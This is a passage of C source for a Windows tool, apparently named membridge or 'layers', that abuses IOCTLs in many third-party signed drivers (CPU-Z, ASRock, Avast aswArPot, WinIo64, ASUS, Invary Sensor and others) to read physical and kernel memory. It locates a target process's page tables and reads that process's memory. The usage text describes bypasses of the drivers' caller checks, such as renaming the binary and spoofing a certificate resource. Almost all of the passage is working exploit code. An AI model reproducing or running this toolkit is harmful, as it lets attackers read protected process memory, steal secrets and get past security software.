            return sec[i].PointerToRawData + (rva - sec[i].VirtualAddress);
    }
    return rva;
}

static uint32_t parse_nt_export_rva(const char *name) {
    FILE *f = fopen("C:\\Windows\\System32\\ntoskrnl.exe", "rb");
    if (!f) return 0;
    fseek(f, 0, SEEK_END);
    long n = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (n <= 0) { fclose(f); return 0; }
    uint8_t *img = (uint8_t *)malloc((size_t)n);
    if (!img) { fclose(f); return 0; }
    if (fread(img, 1, (size_t)n, f) != (size_t)n) { free(img); fclose(f); return 0; }
    fclose(f);
    uint32_t size = (uint32_t)n, out = 0;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)img;
    if (dos->e_magic == IMAGE_DOS_SIGNATURE) {
        IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64 *)(img + dos->e_lfanew);
        IMAGE_DATA_DIRECTORY *dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        if (dir->VirtualAddress && dir->Size) {
            uint32_t off = nt_rva_to_off(img, size, dir->VirtualAddress);
            IMAGE_EXPORT_DIRECTORY *ed = (IMAGE_EXPORT_DIRECTORY *)(img + off);
            uint32_t name_off = nt_rva_to_off(img, size, ed->AddressOfNames);
            uint32_t ord_off = nt_rva_to_off(img, size, ed->AddressOfNameOrdinals);
            uint32_t fun_off = nt_rva_to_off(img, size, ed->AddressOfFunctions);
            for (uint32_t i = 0; i < ed->NumberOfNames; i++) {
                uint32_t no = nt_rva_to_off(img, size, ((uint32_t *)(img + name_off))[i]);
                if (strcmp((const char *)(img + no), name) == 0) {
                    uint16_t ord = ((uint16_t *)(img + ord_off))[i];
                    out = ((uint32_t *)(img + fun_off))[ord];
                    break;
                }
            }
        }
    }
    free(img);
    return out;
}

static uint64_t find_ntoskrnl_base(void) {
    DWORD needed = 0;
    uint64_t base = 0;
    if (!EnumDeviceDrivers(NULL, 0, &needed) || !needed) return 0;
    LPVOID *arr = (LPVOID *)malloc(needed);
    DWORD got = 0;
    if (arr && EnumDeviceDrivers(arr, needed, &got)) {
        int count = (int)(got / sizeof(LPVOID));
        for (int i = 0; i < count; i++) {
            char nm[MAX_PATH] = { 0 };
            if (GetDeviceDriverBaseNameA(arr[i], nm, sizeof(nm)) &&
                (_stricmp(nm, "ntoskrnl.exe") == 0 || _stricmp(nm, "ntkrnlmp.exe") == 0)) {
                base = (uint64_t)(uintptr_t)arr[i];
                break;
            }
        }
    }
    free(arr);
    return base;
}

// Full kkyum locator: open device, find ntoskrnl, read PsInitialSystemProcess,
// walk process list, return target CR3. No physical reader is used.
static int kkyum_locate_cr3(uint32_t pid, const char *device, uint64_t *out_cr3, uint64_t *out_eproc) {
    if (!kkyum_open(device)) return 0;
    uint64_t nt_base = find_ntoskrnl_base();
    if (!nt_base) return 0;
    uint32_t rva = parse_nt_export_rva("PsInitialSystemProcess");
    if (!rva) return 0;
    mb_kernel_reader kr;
    kr.ctx = NULL;
    kr.read = kkyum_kread;
    uint64_t sys_eproc = 0;
    if (!kr.read(&kr, nt_base + rva, &sys_eproc, 8)) return 0;
    if (sys_eproc < 0xFFFF800000000000ull) return 0;
    return mb_layer_locate_cr3_kernel(&kr, sys_eproc, pid, 0x1D8, 0x1D0, 0x28, out_cr3, out_eproc);
}

// ---------------------------------------------------------------------------
// 定位层策略 5: Invary Sensor kernel-VA read (IOCTL 0x9C402408)
// invarysensor.sys dispatches 0x9C402408 -> MmCopyMemory(..., flags=2=Virtual):
//   input {u64 address; u64 size; u8 append_addr; ...}
//   output = size bytes (driver writes into the same SystemBuffer)
// This is a kernel-VA reader; process-list locator can use it like KKYUM.
// ---------------------------------------------------------------------------
static HANDLE g_invary = INVALID_HANDLE_VALUE;

static int invary_build_request(uint64_t va, uint32_t size, uint8_t append, uint8_t *out, uint32_t cap) {
    if (!out || cap < 0x20) return 0;
    memset(out, 0, cap);
    *(uint64_t *)(out + 0x00) = va;
    *(uint64_t *)(out + 0x08) = size;
    *(uint8_t *)(out + 0x10) = append;
    return 1;
}

static int invary_open(const char *device) {
    const char *path = (device && device[0]) ? device : "\\\\.\\invarysensor";
    g_invary = CreateFileA(path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
                           NULL, OPEN_EXISTING, 0, NULL);
    return g_invary != INVALID_HANDLE_VALUE;
}

static int invary_kread(mb_kernel_reader *kr, uint64_t va, void *buf, uint32_t size) {
    (void)kr;
    if (g_invary == INVALID_HANDLE_VALUE || !buf || !size) return 0;
    uint32_t inlen = size + 0x10;
    if (inlen < 0x20) inlen = 0x20;
    uint8_t *in = (uint8_t *)malloc(inlen);
    uint8_t *out = (uint8_t *)malloc(size);
    if (!in || !out) { free(in); free(out); return 0; }
    if (!invary_build_request(va, size, 0, in, inlen)) { free(in); free(out); return 0; }
    DWORD ret = 0;
    BOOL ok = DeviceIoControl(g_invary, 0x9C402408u, in, inlen, out, size, &ret, NULL);
    if (ok) memcpy(buf, out, size);
    free(in);
    free(out);
    return ok ? 1 : 0;
}

static int invary_locate_cr3(uint32_t pid, const char *device, uint64_t *out_cr3, uint64_t *out_eproc) {
    if (!invary_open(device)) return 0;
    uint64_t nt_base = find_ntoskrnl_base();
    if (!nt_base) return 0;
    uint32_t rva = parse_nt_export_rva("PsInitialSystemProcess");
    if (!rva) return 0;
    mb_kernel_reader kr;
    kr.ctx = NULL;
    kr.read = invary_kread;
    uint64_t sys_eproc = 0;
    if (!kr.read(&kr, nt_base + rva, &sys_eproc, 8)) return 0;
    if (sys_eproc < 0xFFFF800000000000ull) return 0;
    return mb_layer_locate_cr3_kernel(&kr, sys_eproc, pid, 0x1D8, 0x1D0, 0x28, out_cr3, out_eproc);
}

// ---------------------------------------------------------------------------
// 定位层策略 4: KPRL l1malwarebits.sys - CR3 by PID (IOCTL 0x239584)
// Input buffer: PID at offset 0; driver returns CR3 at offset 0x38;
// information length 0x48. Device name is configured by the driver (may be
// obfuscated at rest); caller can pass --kprl-device, otherwise common
// candidates are tried.
// ---------------------------------------------------------------------------
static int kprl_build_query(uint32_t pid, uint8_t *buf, uint32_t size) {
    if (!buf || size < 0x48) return 0;
    memset(buf, 0, size);
    *(uint32_t *)(buf + 0) = pid;
    return 1;
}

static int kprl_locate_cr3(uint32_t pid, const char *device, uint64_t *out_cr3) {
    const char *paths[] = { device, "\\\\.\\KPRL", "\\\\.\\kprl", "\\\\.\\l1malwarebits",
                            "\\\\.\\GlobalRoot\\Device\\KPRL" };
    HANDLE h = INVALID_HANDLE_VALUE;
    for (int i = 0; i < (int)(sizeof(paths) / sizeof(paths[0])) && h == INVALID_HANDLE_VALUE; i++) {
        if (!paths[i] || !paths[i][0]) continue;
        h = CreateFileA(paths[i], GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
                        NULL, OPEN_EXISTING, 0, NULL);
    }
    if (h == INVALID_HANDLE_VALUE) return 0;
    uint8_t buf[0x48];
    if (!kprl_build_query(pid, buf, sizeof(buf))) { CloseHandle(h); return 0; }
    DWORD ret = 0;
    BOOL ok = DeviceIoControl(h, 0x239584u, buf, sizeof(buf), buf, sizeof(buf), &ret, NULL);
    CloseHandle(h);
    if (!ok) return 0;
    uint64_t cr3 = *(uint64_t *)(buf + 0x38);
    if (!cr3 || cr3 >= MB_MAX_PHYS) return 0;
    *out_cr3 = cr3;
    return 1;
}

// ---------------------------------------------------------------------------
// 定位层辅助：从注册表读取物理内存范围（HARDWARE\RESOURCEMAP\...\Physical Memory）
// 这样物理扫描 locator 不需要用户手工提供范围，也不需要内核读驱动。
// ---------------------------------------------------------------------------
typedef struct { uint64_t start; uint64_t length; } mb_range;

// Parse a CM_RESOURCE_LIST blob (.Translated REG_RESOURCE_LIST). Kept separate so
// the locator range parser can be tested offline with a synthetic blob.
static int mb_parse_phys_ranges(const uint8_t *data, uint32_t size, mb_range *out, int max) {
    if (!data || size < 20 || !out || max <= 0) return 0;
    uint32_t count = *(uint32_t *)(data + 0);
    uint32_t off = 8;                 // Count + 4-byte alignment padding
    int n = 0;
    for (uint32_t i = 0; i < count && off + 12 <= size && n < max; i++) {
        off += 8;                     // InterfaceType + BusNumber
        uint32_t parts = *(uint32_t *)(data + off);
        off += 4;
        for (uint32_t j = 0; j < parts && off + 20 <= size && n < max; j++) {
            uint8_t dtype = data[off];
            uint16_t flags = *(uint16_t *)(data + off + 2);
            uint64_t start = *(uint64_t *)(data + off + 4);
            uint32_t len = *(uint32_t *)(data + off + 12);
            off += 20;
            if ((dtype != 3 && dtype != 7) || !len) continue;  // Memory / MemoryLarge
            uint64_t L = len;
            if (flags & 0x200) L <<= 8;
            else if (flags & 0x400) L <<= 16;
            else if (flags & 0x800) L <<= 32;
            out[n].start = start;
            out[n].length = L;
            n++;
        }
    }
    return n;
}

static int mb_phys_ranges_from_registry(mb_range *out, int max) {
    HKEY key;
    LONG e = RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                      L"HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
                      0, KEY_READ, &key);
    if (e != ERROR_SUCCESS) {
        fprintf(stderr, "[DBG] RegOpenKeyEx failed err=%ld\n", (long)e);
        return 0;
    }
    DWORD type = 0, size = 0;
    e = RegQueryValueExW(key, L".Translated", NULL, &type, NULL, &size);
    if (e != ERROR_SUCCESS) {
        fprintf(stderr, "[DBG] RegQueryValueEx size failed err=%ld type=%lu size=%lu\n",
                (long)e, (unsigned long)type, (unsigned long)size);
        RegCloseKey(key);
        return 0;
    }
    if (size < 16) {
        fprintf(stderr, "[DBG] registry value too small size=%lu type=%lu\n",
                (unsigned long)size, (unsigned long)type);
        RegCloseKey(key);
        return 0;
    }
    BYTE *data = (BYTE *)malloc(size);
    if (!data) { RegCloseKey(key); return 0; }
    DWORD got = size;
    e = RegQueryValueExW(key, L".Translated", NULL, &type, data, &got);
    if (e != ERROR_SUCCESS) {
        fprintf(stderr, "[DBG] RegQueryValueEx data failed err=%ld got=%lu\n", (long)e, (unsigned long)got);
        free(data);
        RegCloseKey(key);
        return 0;
    }
    RegCloseKey(key);
    if (got < 16) { fprintf(stderr, "[DBG] data too small got=%lu\n", (unsigned long)got); free(data); return 0; }

    int n = mb_parse_phys_ranges(data, got, out, max);
    free(data);
    return n;
}

// ---------------------------------------------------------------------------
// Composition: 定位 + 翻译 + 取数
// ---------------------------------------------------------------------------
static int mb_layer_read_va(mb_phys_reader *r, uint64_t cr3, uint64_t va,
                            void *out, uint32_t size) {
    uint32_t done = 0;
    while (done < size) {
        uint64_t cur = va + done;
        uint64_t pa = 0, page = 0;
        if (!mb_layer_translate(r, cr3, cur, &pa, &page)) {
            fprintf(stderr, "[ERR] translate failed VA=0x%llX\n", (unsigned long long)cur);
            return 0;
        }
        uint32_t page_off = (uint32_t)(cur & 0xFFF);
        uint32_t chunk = size - done;
        if (chunk > 0x1000 - page_off) chunk = 0x1000 - page_off;
        if (!r->read(r, pa, (uint8_t *)out + done, chunk)) {
            fprintf(stderr, "[ERR] fetch failed PA=0x%llX\n", (unsigned long long)pa);
            return 0;
        }
        done += chunk;
    }
    return 1;
}

// Diagnostic: probe which real provider devices are currently present.
static int probe_readers(void) {
    const char *kinds[] = { "cchwapi", "rtkio", "eneio64", "asrdrv", "mrt", "cpuz",
                            "asupio64", "asio2", "aswarpot", "winio64" };
    int present = 0;
    for (size_t i = 0; i < sizeof(kinds) / sizeof(kinds[0]); i++) {
        mb_phys_reader r;
        memset(&r, 0, sizeof(r));
        r.dev = INVALID_HANDLE_VALUE;
        if (reader_open(&r, kinds[i], NULL)) {
            printf("[OPEN] %s\n", kinds[i]);
            present++;
            if (r.dev && r.dev != INVALID_HANDLE_VALUE) CloseHandle(r.dev);
        } else {
            printf("[----] %s unavailable\n", kinds[i]);
        }
    }
    printf("providers_present=%d/%zu\n", present, sizeof(kinds) / sizeof(kinds[0]));
    return 0;
}

// ---------------------------------------------------------------------------
// Offline self-test: synthetic physical memory + page tables + fake EPROCESS
// ---------------------------------------------------------------------------
static int g_fail = 0;
static void check(const char *layer, const char *what, int ok) {
    printf("[%s] %s: %s\n", ok ? "PASS" : "FAIL", layer, what);
    if (!ok) g_fail++;
}

static int selftest_mock(void) {
    printf("== membridge layers offline self-test (mock physical memory) ==\n");
    const uint64_t mem_size = 0x400000;
    uint8_t *mem = (uint8_t *)calloc(1, mem_size);
    if (!mem) return 2;

    // 4-level page tables: VA 0x400000 -> PA 0x5000
    const uint64_t cr3 = 0x1000;
    *(uint64_t *)(mem + 0x1000 + 0 * 8) = 0x2003;          // PML4[0]
    *(uint64_t *)(mem + 0x2000 + 0 * 8) = 0x3003;          // PDPT[0]
    *(uint64_t *)(mem + 0x3000 + 2 * 8) = 0x4003;          // PD[2] -> PT
    *(uint64_t *)(mem + 0x4000 + 0 * 8) = 0x5003;          // PT[0] -> 4KB page
    *(uint64_t *)(mem + 0x4000 + 1 * 8) = 0x6003;          // PT[1] -> 4KB page (cross-page)
    const char *data = "MEMBRIDGE_LAYERS_MOCK_DATA_0123456789";
    memcpy(mem + 0x5000, data, strlen(data));
    memset(mem + 0x5FF0, 0x11, 0x10);
    memset(mem + 0x6000, 0x22, 0x10);

    // large-page entries: PD[1] = 2MB page PA 0x200000; PDPT[1] = 1GB page PA 0x40000000
    // PDPT[2] = 1GB page PA 0x0 (used to verify large-page fetch composition)
    *(uint64_t *)(mem + 0x3000 + 1 * 8) = 0x200083;        // 2MB page (PS)
    *(uint64_t *)(mem + 0x2000 + 1 * 8) = 0x40000083ull;   // 1GB page (PS)
    *(uint64_t *)(mem + 0x2000 + 2 * 8) = 0x83ull;         // 1GB page PA 0
    const char *large_data = "LARGE_PAGE_2MB_DATA_0123456789";
    memcpy(mem + 0x200010, large_data, strlen(large_data));

    // fake EPROCESS at PA 0x8000: name @+0x338, PID @+0x1D0, DTB @+0x28
    memcpy(mem + 0x8000 + EP_NAME, "MOCK.exe", 9);
    *(uint32_t *)(mem + 0x8000 + EP_PID) = 4242;
    *(uint64_t *)(mem + 0x8000 + EP_DTB) = cr3;

    mb_phys_reader r;
    memset(&r, 0, sizeof(r));
    r.name = "mock";
    r.mode = 3;
    r.read = read_mock;
    r.mock_mem = mem;
    r.mock_size = mem_size;

    // 取数层 alone
    uint8_t got[64];
    memset(got, 0, sizeof(got));
    int ok_fetch = r.read(&r, 0x5000, got, (uint32_t)strlen(data)) && memcmp(got, data, strlen(data)) == 0;
    check("取数层(fetcher)", "PA=0x5000 bytes match mock data", ok_fetch);

    // 翻译层 alone
    uint64_t pa = 0, page = 0;
    int ok_tr = mb_layer_translate(&r, cr3, 0x400000, &pa, &page) && pa == 0x5000 && page == 0x1000;
    check("翻译层(translator)", "VA=0x400000 -> PA=0x5000 (4KB page)", ok_tr);
    uint64_t pa2 = 0, page2 = 0;
    int ok_tr2 = mb_layer_translate(&r, cr3, 0x400010, &pa2, &page2) && pa2 == 0x5010;
    check("翻译层(translator)", "VA=0x400010 -> PA=0x5010 (offset preserved)", ok_tr2);

    uint64_t pa2m = 0, page2m = 0;
    int ok_2m = mb_layer_translate(&r, cr3, 0x200000, &pa2m, &page2m) &&
                pa2m == 0x200000 && page2m == 0x200000;
    check("翻译层(translator)", "VA=0x200000 -> PA=0x200000 (2MB page)", ok_2m);
    uint8_t lpage[64];
    memset(lpage, 0, sizeof(lpage));
    int ok_2m_read = mb_layer_read_va(&r, cr3, 0x200010, lpage, (uint32_t)strlen(large_data)) &&
                     memcmp(lpage, large_data, strlen(large_data)) == 0;
    check("三层组合(pipeline)", "read VA 0x200010 through 2MB page", ok_2m_read);
    uint64_t pa1g = 0, page1g = 0;
    int ok_1g = mb_layer_translate(&r, cr3, 0x40000000, &pa1g, &page1g) &&
                pa1g == 0x40000000 && page1g == 0x40000000;
    check("翻译层(translator)", "VA=0x40000000 -> PA=0x40000000 (1GB page)", ok_1g);
    // 1GB page with base PA 0: VA 0x80001000 -> PA 0x1000 (PML4[0] = 0x2003)
    uint64_t pa1g2 = 0, page1g2 = 0, gotq = 0;
    int ok_1g_read = mb_layer_translate(&r, cr3, 0x80001000, &pa1g2, &page1g2) &&
                     pa1g2 == 0x1000 && page1g2 == 0x40000000 &&
                     r.read(&r, pa1g2, &gotq, 8) && gotq == 0x2003;
    check("三层组合(pipeline)", "read VA 0x80001000 through 1GB page", ok_1g_read);

    // cross-page composition: VA 0x400FF0 (PA 0x5FF0) -> 0x401000 (PA 0x6000)
    uint8_t cross[0x20];
    memset(cross, 0, sizeof(cross));
    int ok_cross = mb_layer_read_va(&r, cr3, 0x400FF0, cross, sizeof(cross)) &&
                   cross[0] == 0x11 && cross[0x0F] == 0x11 && cross[0x10] == 0x22;
    check("三层组合(pipeline)", "cross-page read VA 0x400FF0 (two 4KB pages)", ok_cross);

    // negative: unmapped VA must be rejected by the translator
    uint64_t bad_pa = 0, bad_ps = 0;
    int ok_unmapped = !mb_layer_translate(&r, cr3, 0x800000, &bad_pa, &bad_ps);
    check("翻译层(translator)", "unmapped VA=0x800000 rejected", ok_unmapped);

    // AsUpIO64 provider request layout (offline, no driver): page-aligned map range
    uint8_t map_req[24];
    int ok_asup = asupio64_build_map_request(0x12345678, 0x100, map_req) &&
                  *(uint32_t *)(map_req + 0) == 1 &&
                  *(uint32_t *)(map_req + 4) == 0 &&
                  *(uint64_t *)(map_req + 8) == 0x12345000ull &&
                  *(uint32_t *)(map_req + 16) == 0 &&
                  *(uint32_t *)(map_req + 20) == 0x1000;
    check("取数层(fetcher)", "asupio64 map request layout (page-aligned)", ok_asup);

    // AsUpIO64 cross-page map request: PA 0x12345FFF + 0x10 must map two pages
    uint8_t map_req2[24];
    int ok_asup2 = asupio64_build_map_request(0x12345FFF, 0x10, map_req2) &&
                   *(uint64_t *)(map_req2 + 8) == 0x12345000ull &&
                   *(uint32_t *)(map_req2 + 20) == 0x2000;
    check("取数层(fetcher)", "asupio64 cross-page map request (map size 0x2000)", ok_asup2);

    // AsIO2 map request layout (offline, no driver): 0x28 struct, size/phys at 0/8
    uint8_t asio2_req[0x28];
    int ok_asio2 = asio2_build_map_request(0x12345678, 0x100, asio2_req) &&
                   *(uint64_t *)(asio2_req + 0x00) == 0x1000 &&
                   *(uint64_t *)(asio2_req + 0x08) == 0x12345000ull &&
                   *(uint64_t *)(asio2_req + 0x18) == 0;
    check("取数层(fetcher)", "asio2 map request layout (gate-bypass PE)", ok_asio2);

    // other provider request layouts (offline): cpuz / mrt / asrdrv
    uint32_t czreq[2];
    int ok_cz = cpuz_build_request(0x12345678, 0xDEADBEEF, czreq) &&
                czreq[0] == 0x12345678 && czreq[1] == 0xDEADBEEF;
    check("取数层(fetcher)", "cpuz request layout (addr/expected)", ok_cz);
    uint8_t mrq[16];
    int ok_mr = mrt_build_request(0x10000000, 0x1000, mrq) &&
                *(uint64_t *)(mrq + 0) == 0x10000000ull &&
                *(uint32_t *)(mrq + 8) == 0x1000 &&
                *(uint32_t *)(mrq + 12) == 0;
    check("取数层(fetcher)", "mrt request layout (PA/size/flags)", ok_mr);
    asr_cmd acmd;
    void *dummy = (void *)(uintptr_t)0x1234;
    int ok_asr = asrdrv_build_read_cmd(0x10000000, 0x200, dummy, &acmd) &&
                 acmd.opcode == 0x22E808u &&
                 acmd.args.q[0] == 0x10000000ull &&
                 acmd.args.d[2] == 0x200 &&
                 acmd.args.d[3] == 0 &&
                 acmd.args.q[2] == (UINT64)(uintptr_t)dummy;
    check("取数层(fetcher)", "asrdrv read command layout (opcode/args)", ok_asr);

    // Avast aswArPot physical read request layout (offline, no driver)
    uint8_t aswrq[12];
    int ok_aswr = aswarpot_build_read_request(0x12345678, 0x1000, aswrq) &&
                  *(uint32_t *)(aswrq + 0) == 0x12345678 &&
                  *(uint32_t *)(aswrq + 8) == 0x1000;
    check("取数层(fetcher)", "aswArPot physical read request layout", ok_aswr);

    // WinIo64 MAPPHYSTOLIN request layout (offline, no driver)
    uint8_t wioreq[0x28];
    int ok_wio = winio64_build_map_request(0x12345678, 0x100, wioreq) &&
                 *(uint64_t *)(wioreq + 0x00) == 0x1000 &&
                 *(uint64_t *)(wioreq + 0x08) == 0x12345000ull;
    check("取数层(fetcher)", "winio64 map request layout (size/phys)", ok_wio);

    // 定位层 alone (physical EPROCESS scan, no kernel reader)
    uint64_t located_cr3 = 0, eproc = 0;
    int ok_loc = mb_layer_locate_cr3_scan(&r, 0x8000, 0x1000, 4242, "MOCK.exe",
                                          &located_cr3, &eproc) && located_cr3 == cr3;
    check("定位层(locator)", "PID 4242 / MOCK.exe -> CR3=0x1000 (physical scan)", ok_loc);
    check("定位层(locator)", "fake EPROCESS PA=0x8000", ok_loc && eproc == 0x8000);

    // 定位层 strategy 3 mock: kernel-VA reader + ActiveProcessLinks walk.
    // This path uses no physical reader at all.
    uint8_t *kmem = (uint8_t *)calloc(1, 0x3000);
    int ok_kloc = 0;
    if (kmem) {
        const uint64_t kbase = 0xFFFF800000100000ull;
        uint64_t ksys = kbase + 0x1000, ktgt = kbase + 0x2000;
        *(uint32_t *)(kmem + 0x1000 + EP_PID) = 4;
        *(uint64_t *)(kmem + 0x1000 + EP_DTB) = cr3;
        *(uint32_t *)(kmem + 0x2000 + EP_PID) = 4243;
        *(uint64_t *)(kmem + 0x2000 + EP_DTB) = 0x3000;
        *(uint64_t *)(kmem + 0x1000 + 0x1D8) = ktgt + 0x1D8;
        *(uint64_t *)(kmem + 0x2000 + 0x1D8) = ksys + 0x1D8;
        mock_kva mk;
        mk.mem = kmem; mk.base = kbase; mk.size = 0x3000;
        mb_kernel_reader kr;
        kr.ctx = &mk;
        kr.read = mock_kva_read;
        uint64_t kcr3 = 0, kep = 0;
        ok_kloc = mb_layer_locate_cr3_kernel(&kr, ksys, 4243, 0x1D8, 0x1D0, 0x28, &kcr3, &kep) &&
                  kcr3 == 0x3000 && kep == ktgt;
        free(kmem);
    }
    check("定位层(locator)", "kernel-reader list walk -> CR3=0x3000 (no physical reader)", ok_kloc);

    // KPRL CR3-by-PID query request layout (offline, no driver)
    uint8_t kprl_req[0x48];
    int ok_kprl = kprl_build_query(4245, kprl_req, sizeof(kprl_req)) &&
                  *(uint32_t *)(kprl_req + 0) == 4245 &&
                  *(uint32_t *)(kprl_req + 4) == 0;
    check("定位层(locator)", "kprl CR3 query request layout (pid at offset 0)", ok_kprl);

    // Invary Sensor kernel-VA request layout (offline, no driver)
    uint8_t inv_req[0x20];
    int ok_inv = invary_build_request(0xFFFF800000100000ull, 8, 0, inv_req, sizeof(inv_req)) &&
                 *(uint64_t *)(inv_req + 0x00) == 0xFFFF800000100000ull &&
                 *(uint64_t *)(inv_req + 0x08) == 8 &&
                 *(uint8_t *)(inv_req + 0x10) == 0;
    check("取数层(fetcher)", "invarysensor kernel-VA read request layout", ok_inv);

    // full pipeline: locate -> translate -> fetch
    uint64_t cr3b = 0;
    uint8_t pipe[64];
    memset(pipe, 0, sizeof(pipe));
    int ok_pipe = mb_layer_locate_cr3_scan(&r, 0x8000, 0x1000, 4242, "MOCK.exe", &cr3b, NULL) &&
                  mb_layer_read_va(&r, cr3b, 0x400000, pipe, (uint32_t)strlen(data)) &&
                  memcmp(pipe, data, strlen(data)) == 0;
    check("三层组合(pipeline)", "locate -> translate -> fetch returns mock data", ok_pipe);

    // independence checks: translator works with explicit CR3 and no locator;
    // fetcher works with a raw PA and no translator.
    uint8_t raw[16];
    memset(raw, 0, sizeof(raw));
    int ok_indep1 = r.read(&r, 0x5000, raw, 16) && memcmp(raw, data, 16) == 0;
    uint64_t pa3 = 0, page3 = 0;
    int ok_indep2 = mb_layer_translate(&r, 0x1000, 0x400000, &pa3, &page3);
    check("独立性(independence)", "取数层 usable without locator/translator", ok_indep1);
    check("独立性(independence)", "翻译层 usable without locator", ok_indep2);

    // locator helper: synthetic CM_RESOURCE_LIST parsing (Memory + MemoryLarge)
    uint8_t blob[60];
    memset(blob, 0, sizeof(blob));
    *(uint32_t *)(blob + 0) = 1;          // Count
    *(uint32_t *)(blob + 8) = 0;          // InterfaceType
    *(uint32_t *)(blob + 12) = 0;         // BusNumber
    *(uint32_t *)(blob + 16) = 2;         // PartialResourceList.Count
    *(uint8_t *)(blob + 20) = 3;          // CmResourceTypeMemory
    *(uint64_t *)(blob + 24) = 0x100000;  // start
    *(uint32_t *)(blob + 32) = 0x1000;    // length
    *(uint8_t *)(blob + 40) = 7;          // CmResourceTypeMemoryLarge
    *(uint16_t *)(blob + 42) = 0x200;     // flags: large 40-bit
    *(uint64_t *)(blob + 44) = 0x100000000ull;
    *(uint32_t *)(blob + 52) = 0x100;     // length << 8
    mb_range pr[4];
    int npr = mb_parse_phys_ranges(blob, sizeof(blob), pr, 4);
    int ok_parse = npr == 2 && pr[0].start == 0x100000 && pr[0].length == 0x1000 &&
                   pr[1].start == 0x100000000ull && pr[1].length == 0x10000;
    check("定位层(locator)", "registry range parser (Memory/MemoryLarge)", ok_parse);

    // robustness: malformed locator/translator inputs must be rejected
    uint8_t tiny[10];
    memset(tiny, 0, sizeof(tiny));
    int ok_tiny = mb_parse_phys_ranges(tiny, sizeof(tiny), pr, 4) == 0;
    check("定位层(locator)", "truncated CM_RESOURCE_LIST rejected", ok_tiny);
    uint8_t malformed[20];
    memset(malformed, 0, sizeof(malformed));
    *(uint32_t *)(malformed + 0) = 0xFFFF;  // absurd Count
    int ok_mal = mb_parse_phys_ranges(malformed, sizeof(malformed), pr, 4) == 0;
    check("定位层(locator)", "oversized resource Count rejected", ok_mal);
    uint64_t pa_bad = 0, page_bad = 0;
    int ok_badcr3 = !mb_layer_translate(&r, 0, 0x400000, &pa_bad, &page_bad);
    check("翻译层(translator)", "CR3=0 rejected", ok_badcr3);

    free(mem);
    printf("VERDICT=%s\n", g_fail ? "FAIL" : "PASS");
    return g_fail ? 1 : 0;
}

// ---------------------------------------------------------------------------
// CLI
// ---------------------------------------------------------------------------
static void usage(void) {
    printf("layers - independent 定位层 / 翻译层 / 取数层 architecture\n");
    printf("Usage:\n");
    printf("  layers --probe-readers  (try opening every real fetch-layer provider device)\n");
    printf("  layers --selftest-mock\n");
    printf("  layers --ranges                       (read physical RAM ranges from registry)\n");
    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2|aswarpot|winio64> [--device <path>] --read-phys --pa <hex> --size <n>\n");
    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2|aswarpot|winio64> [--device <path>] --cr3 <hex> --va <hex> --size <n>\n");
    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2|aswarpot|winio64> [--device <path>] --locate --pid <pid> --scan-start <hex> --scan-size <hex> [--name <exe>]\n");
    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2|aswarpot|winio64> [--device <path>] --locate --pid <pid> --auto-ranges [--name <exe>]\n");
    printf("  layers --reader ... --locate --pid <pid> (--scan-start/--scan-size | --auto-ranges) --va <hex> --size <n>\n");
    printf("  layers --locate --kkyum --pid <pid> [--kkyum-device <path>]   (kernel-VA locator; no physical reader needed)\n");
    printf("  layers --locate --kprl --pid <pid> [--kprl-device <path>]     (KPRL CR3-by-PID; no physical reader needed)\n");
    printf("  layers --locate --invary --pid <pid> [--invary-device <path>] (Invary Sensor kernel-VA locator)\n");
    printf("  layers --invary-read --va <hex> --size <n> [--invary-device <path>] (kernel-VA bytes via Invary)\n");
    printf("  note: --reader cpuz requires --expect-first <dword> (target page first dword, guard bypass)\n");
    printf("  note: --reader asupio64 requires layers.exe to be named PEUPDATER.EXE (AsUpIO64 gate)\n");
    printf("  note: --reader asio2 requires bin\\layers_asio2.exe (ASUSCERT resource + timestamp 0 gate bypass)\n");
}

int main(int argc, char **argv) {
    const char *kind = NULL, *device = NULL, *name = NULL, *kkyum_device = NULL, *kprl_device = NULL, *invary_device = NULL;
    uint64_t pa = 0, cr3 = 0, va = 0, scan_start = 0, scan_size = 0;
    uint32_t size = 0x40, pid = 0, expect_first = 0;
    int do_selftest = 0, do_read_phys = 0, do_explicit = 0, do_locate = 0, have_cr3 = 0, have_va = 0;
    int do_ranges = 0, auto_ranges = 0, use_kkyum = 0, use_kprl = 0, use_invary = 0, do_invary_read = 0, do_probe = 0;
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--selftest-mock") == 0) do_selftest = 1;
        else if (strcmp(argv[i], "--probe-readers") == 0) do_probe = 1;
        else if (strcmp(argv[i], "--reader") == 0 && i + 1 < argc) kind = argv[++i];
        else if (strcmp(argv[i], "--device") == 0 && i + 1 < argc) device = argv[++i];
        else if (strcmp(argv[i], "--kkyum-device") == 0 && i + 1 < argc) kkyum_device = argv[++i];
        else if (strcmp(argv[i], "--kprl-device") == 0 && i + 1 < argc) kprl_device = argv[++i];
        else if (strcmp(argv[i], "--invary-device") == 0 && i + 1 < argc) invary_device = argv[++i];
        else if (strcmp(argv[i], "--name") == 0 && i + 1 < argc) name = argv[++i];
        else if (strcmp(argv[i], "--expect-first") == 0 && i + 1 < argc) expect_first = (uint32_t)strtoul(argv[++i], NULL, 0);
        else if (strcmp(argv[i], "--pa") == 0 && i + 1 < argc) pa = _strtoui64(argv[++i], NULL, 0);
        else if (strcmp(argv[i], "--cr3") == 0 && i + 1 < argc) { cr3 = _strtoui64(argv[++i], NULL, 0); have_cr3 = 1; }
        else if (strcmp(argv[i], "--va") == 0 && i + 1 < argc) { va = _strtoui64(argv[++i], NULL, 0); have_va = 1; }
        else if (strcmp(argv[i], "--size") == 0 && i + 1 < argc) size = (uint32_t)strtoul(argv[++i], NULL, 0);
